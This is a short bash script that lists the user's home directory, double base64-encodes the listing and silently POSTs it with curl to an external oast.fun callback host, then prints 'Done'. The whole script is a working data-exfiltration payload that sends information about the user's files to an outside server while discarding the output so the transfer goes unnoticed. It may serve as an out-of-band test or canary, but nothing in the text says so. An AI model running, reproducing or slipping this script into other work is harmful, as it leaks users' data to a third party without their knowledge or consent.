#!/bin/bash

B64_BLOB=`ls $HOME | base64 | base64`

curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null

echo "Done"